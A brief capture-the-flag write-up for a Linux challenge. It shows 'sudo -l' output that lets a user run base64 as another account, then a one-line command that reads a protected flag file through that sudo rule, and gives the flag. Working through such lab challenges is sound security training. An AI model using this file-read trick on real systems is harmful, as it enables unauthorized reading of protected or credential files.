# linux 1

## Write-up

executing sudo -l gives us : 

User ctf may run the following commands on 3e6b5a09c7dc:
    (admin : admin) /usr/bin/base64

running this command will give us the flag 

sudo -u admin base64 ./flag.txt | base64 -d 
## Flag

`nexus{$uD0_usAge_G1VES_priv1L3Ge$}`